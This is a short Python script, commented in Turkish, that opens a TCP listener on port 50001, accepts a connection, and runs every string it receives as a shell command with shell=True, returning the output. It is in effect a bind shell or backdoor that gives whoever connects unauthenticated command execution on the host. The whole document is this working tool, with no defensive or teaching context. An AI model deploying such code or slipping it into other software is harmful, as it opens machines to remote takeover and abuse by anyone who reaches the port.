import socket
import subprocess

host = "127.0.0.1"
port = 50001

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port)) #sockete bağlantı oluştur.
server_socket.listen() #Gelen bağlantıları dinle

conn, addr = server_socket.accept() #Gelen bağlantı isteklerini kabul et
print("Connected from : "+str(addr))

while True:
    data = conn.recv(1024).decode()
    print(data)
    result = subprocess.run(data, stdout= subprocess.PIPE, shell = True)
    if(result.stdout.decode() != ""):
        response_data = result.stdout
    else:
        response_data = "Command Executed...".encode()
    conn.send(response_data)
conn.close()
